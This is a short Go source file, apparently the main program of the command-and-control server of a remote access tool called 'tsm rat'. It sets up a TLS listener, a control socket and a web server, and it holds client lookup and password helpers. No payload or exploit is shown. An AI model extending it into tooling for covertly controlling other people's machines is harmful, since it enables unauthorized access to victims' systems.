package main

import (
	"rat/command/log"
	"rat/shared"
)

func main() {
	log.Println("tsm rat", shared.Version)

	if !CertExists() {
		log.Println("generating certificate...")
		GenerateCertificate("localhost")
	}

	go TLSServer{"127.0.0.1:9999"}.Listen()

	InitControlSocket()

	startWebserver()
}

func GetClient(id int) *Client {
	for _, client := range Clients {
		if client.Id == id {
			return client
		}
	}

	return nil
}

func Authenticate(p string) bool {
	return p == GlobalConfig.Password
}
